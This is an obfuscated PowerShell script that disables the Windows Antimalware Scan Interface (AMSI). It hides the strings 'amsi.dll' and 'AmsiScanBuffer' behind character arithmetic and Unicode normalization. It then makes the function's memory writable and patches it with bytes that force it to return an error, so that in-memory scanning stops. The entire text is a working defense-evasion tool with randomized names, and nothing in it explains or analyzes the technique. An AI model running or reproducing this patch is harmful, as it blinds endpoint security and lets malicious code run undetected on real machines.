$TIgTS = @"
using System;
using System.Runtime.InteropServices;
public class TIgTS {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr W99I17OMRWeTwFA, string QkwS);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr DUa3S_MmZIW20Wmy, UIntPtr o1IdYFaK9JGXu_bZ, uint YkLl, out uint iWSVIE9e_jm8tfeYOqf);
}
"@

Add-Type $TIgTS

$PL6cagML = [TIgTS]::LoadLibrary("$(('ãmsí'+'.dll').noRmalIZe([cHAr]([ByTe]0x46)+[CHaR]([bYTe]0x6f)+[char](52+62)+[chAr](109+58-58)+[chAr]([BytE]0x44)) -replace [char](37+55)+[cHaR]([byTE]0x70)+[CHAr](123+4-4)+[ChAR]([bYTe]0x4d)+[chAR](110*26/26)+[CHAr](125))")
$HHrIyPOR7ji9a3O = [TIgTS]::GetProcAddress($PL6cagML, "$([cHAr](65*27/27)+[CHaR](109*6/6)+[ChAR](115+77-77)+[ChAR]([BYte]0x69)+[chAR]([byTe]0x53)+[chAr](99+58-58)+[chAR]([ByTE]0x61)+[cHAr]([BYTe]0x6e)+[ChaR]([ByTE]0x42)+[ChAR](117)+[char]([ByTE]0x66)+[cHAR]([bYtE]0x66)+[cHAr]([bYTE]0x65)+[CHAR](114+81-81))")
$p = 0
[TIgTS]::VirtualProtect($HHrIyPOR7ji9a3O, [uint32]5, 0x40, [ref]$p)
$yvK16I6BKG3Ea = "0xB8"
$naj2PeW386RdXeC = "0x57"
$PS1c9Sg = "0x00"
$ApDMIBV = "0x07"
$Vn6qF4ZiNKEOV0Mmm0Er = "0x80"
$Fw24ZYLPYeJJJjatR_ = "0xC3"
$UgUGKqxjHypdQJ = [Byte[]] ($yvK16I6BKG3Ea,$naj2PeW386RdXeC,$PS1c9Sg,$ApDMIBV,+$Vn6qF4ZiNKEOV0Mmm0Er,+$Fw24ZYLPYeJJJjatR_)
[System.Runtime.InteropServices.Marshal]::Copy($UgUGKqxjHypdQJ, 0, $HHrIyPOR7ji9a3O, 6)